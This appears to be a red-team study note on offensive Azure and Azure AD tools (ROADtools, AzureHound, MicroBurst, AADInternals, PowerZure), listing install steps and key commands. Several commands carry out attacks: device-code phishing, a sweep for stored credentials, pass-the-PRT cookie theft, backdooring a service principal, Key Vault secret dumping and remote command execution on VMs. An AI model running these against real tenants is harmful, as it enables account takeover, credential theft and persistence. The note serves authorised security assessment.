# 02.6 — Azure Tools — ROADtools, AzureHound, MicroBurst, AADInternals

## What This Note Covers

The core Azure-specific security toolset: installation, configuration, key commands, and what each tool does best. These are the tools you reach for on every Azure engagement.

---

## ROADtools

### What It Is

ROADtools by Dirk-jan Mollema is the foundational Azure AD enumeration framework. It dumps the entire Azure AD tenant into a local SQLite database and provides a GUI for browsing users, groups, service principals, app registrations, OAuth permissions, role assignments, and Conditional Access policies.

### Install

```bash
pip3 install roadtools
pip3 install roadrecon
pip3 install roadtx  # ROADtools token exchange (advanced token manipulation)
```

### Authentication

```bash
# Device code flow (recommended — interactive)
roadrecon auth --device-code

# Username/password (non-interactive, no MFA)
roadrecon auth -u user@company.com -p 'Password123!'

# Existing access token
roadrecon auth --access-token eyJ0eXAi...

# Service principal (client credentials)
roadrecon auth \
  --client-id APP_ID \
  --client-secret SECRET \
  --tenant TENANT_ID

# PRT-based auth (via roadtx)
roadtx gettokens --prt PRT_TOKEN --prt-sessionkey SESSION_KEY
```

### Data Collection

```bash
# Gather all Azure AD data (hits Microsoft Graph API)
roadrecon gather

# Gather with specific token
roadrecon gather --access-token eyJ0eXAi...

# What it collects:
# - All users (member + guest)
# - All groups (security + M365)
# - All service principals and their app registrations
# - All directory role assignments
# - OAuth 2.0 permission grants (app permissions)
# - Conditional Access policies
# - Managed identity assignments
# - Device registrations
```

### GUI Explorer

```bash
# Launch the web UI
roadrecon gui
# Open: http://localhost:5000

# Key things to look for in the GUI:
# Users → sort by role → find Global Admins
# Service Principals → click each → check "Azure Role Assignments" tab
# App Registrations → check "Credentials" (secrets/certs) + "Permissions"
# OAuth Grants → check "High Privilege Grants" filter → overprivileged apps
# Conditional Access → look for policy gaps (users excluded, apps not covered)
```

### Advanced — ROADtx (Token Exchange)

```bash
# Install
pip3 install roadtx

# Device code phishing
roadtx device -c d3590ed6-52b3-4102-aeff-aad2292ab01c

# Refresh token → access token for different resource
roadtx tokens -r https://graph.microsoft.com/ --refresh-token RT

# Seamless SSO token extraction (on Windows domain)
roadtx getusertoken --username user@company.com --password pass
```

## AzureHound (BloodHound for Azure)

### What It Is

AzureHound is the Azure collector for BloodHound — the attack path visualisation tool. It maps Azure AD and Azure RBAC relationships into a graph database and visualises privilege escalation paths.

### Install

```bash
# Download the latest binary release
# https://github.com/BloodHoundAD/AzureHound/releases
# Available for Linux, macOS, Windows

# BloodHound Community Edition (required to visualise)
# https://github.com/SpecterOps/BloodHound
# Run via Docker:
docker-compose -f docker-compose.yml up
# Access: http://localhost:8080
```

### Collect Azure AD Data

```bash
# Authenticate and collect (outputs JSON files for BloodHound)
./azurehound -u user@company.com -p 'Password123!' list --tenant TENANT_ID -o output.json

# With service principal
./azurehound \
  --client-id APP_ID \
  --client-secret SECRET \
  --tenant TENANT_ID \
  list \
  -o azurehound-output.json

# With refresh token
./azurehound \
  --refresh-token REFRESH_TOKEN \
  --tenant TENANT_ID \
  list \
  -o azurehound-output.json
```

### Import into BloodHound and Query

```bash
# 1. Open BloodHound Community Edition (localhost:8080)
# 2. Upload the azurehound-output.json file
# 3. Run pre-built queries:

# "Find all Global Admins"
# "Find Paths to Global Admin"
# "Find Service Principals with High Privilege"
# "Shortest Paths to Subscription Owner"
# "Find Tenants with No MFA"
```

> [!tip] BloodHound is the fastest way to find escalation paths
> What takes hours of manual enumeration in ROADtools, BloodHound shows in seconds as a graph. Run it early in every Azure engagement. The "Shortest Paths to Global Admin" query is gold.

## MicroBurst

### What It Is

MicroBurst by NetSPI is a PowerShell toolkit for Azure and Azure AD security assessments. It automates discovery of exposed storage, enumeration of resources, and finding common misconfigurations.

### Install

```powershell
# PowerShell (run as appropriate user)
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name AzureAD -AllowClobber -Force

git clone https://github.com/NetSPI/MicroBurst
cd MicroBurst
Import-Module .\MicroBurst.psm1
```

### Key Functions

```powershell
# Connect to Azure
Connect-AzAccount
Connect-AzureAD

# Enumerate storage accounts and check for public blobs
Invoke-EnumerateAzureBlobs -Base "targetcompany"
# Tries: targetcompany.blob.core.windows.net + common container names

# Find storage accounts with public access in the subscription
Get-AzStorageContainerPublicAccess

# Get all Azure AD passwords/credentials stored in resources
Get-AzurePasswords
# Checks: App Service config, Automation accounts, AKS secrets, Key Vaults, Storage keys

# Enumerate all runbooks in Automation accounts (often contain creds)
Get-AzureRunAsAccount

# Find function app environment variables
Get-AzFunctionAppEnvironmentVariables -ResourceGroup RG_NAME

# Enumerate API management services
Get-AzAPIs
```

> [!tip] Get-AzurePasswords is the fastest credential sweep
> This single command checks App Services, Automation Accounts, Key Vaults, and more. Run it immediately after gaining Contributor-level access to a subscription.

## AADInternals

### What It Is

AADInternals by Dr Nestori Syynimaa is the most comprehensive Azure AD and Microsoft 365 offensive toolkit. Covers everything from tenant recon to token attacks, PRT extraction, Golden SAML, pass-the-PRT, and more.

### Install

```powershell
# PowerShell (Windows)
Install-Module AADInternals -Force
Import-Module AADInternals
```

### Key Operations

```powershell
# Unauthenticated tenant recon
Invoke-AADIntReconAsOutsider -DomainName "target.com"
# Returns: tenant name, ID, federation info, federation protocol

# Get tenant login information
Get-AADIntLoginInformation -Domain "target.com"

# User enumeration (unauthenticated)
Invoke-AADIntUserEnumerationAsOutsider -UserName "user@target.com"
# Returns whether user exists and authentication type

# Authenticate (various methods)
$cred = Get-Credential
Get-AADIntAccessTokenForAADGraph -Credentials $cred

# Device code phishing
$response = Get-AADIntAccessTokenForAADGraph -DeviceCode

# PRT-based authentication (on AAD-joined device)
$prtToken = Get-AADIntUserPRTToken
$accessToken = Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

# List all tenant users
Get-AADIntUsers -AccessToken $accessToken

# List all Azure AD groups
Get-AADIntGroups -AccessToken $accessToken

# List users with specific roles
Get-AADIntRoleMembers -RoleName "Global Administrator"

# Extract pass-the-PRT cookie for browser session
Get-AADIntAccessTokenForIntuneMDM -PRTToken $prtToken
# Use cookie in browser → authenticated as victim without credentials

# Backdoor: Add a new credential to a service principal
Add-AADIntServicePrincipalCredential -ObjectId SP_OBJECT_ID -AccessToken $token
```

## PowerZure

### What It Is

PowerZure is a PowerShell framework by Ryan Hausknecht for attacking and assessing Azure environments. Focused on post-exploitation once you have valid credentials.

### Install

```powershell
git clone https://github.com/hausec/PowerZure
Import-Module .\PowerZure.ps1
```

### Key Functions

```powershell
# Show all commands
Show-PowerZure

# Get all resources in subscription
Get-AzureTargets

# Find runbooks with credentials
Get-AzureRunbook

# Get secrets from Key Vault
Get-AzureKeyVaultContent -VaultName TARGET_VAULT

# Get app service environment variables (often contain secrets)
Get-AzureAppServiceDetails

# Execute commands on Azure VMs
Invoke-AzureRunCommand -VM VM_NAME -ResourceGroup RG -Command "whoami"

# Upload and execute on a VM
Write-AzureRunCommand -VM VM_NAME -ResourceGroup RG -Script script.ps1
```

## Tool Selection Guide

| Task | Best Tool |
|---|---|
| Initial tenant recon (no creds) | AADInternals (`Invoke-AADIntReconAsOutsider`) |
| Comprehensive Azure AD dump | ROADtools (`roadrecon gather`) |
| Attack path visualisation | AzureHound + BloodHound |
| Find exposed storage/credentials | MicroBurst (`Get-AzurePasswords`, `Invoke-EnumerateAzureBlobs`) |
| Token manipulation and phishing | ROADtx, AADInternals |
| Post-exploitation resource abuse | PowerZure |
| PRT extraction and abuse | AADInternals + ROADtx |
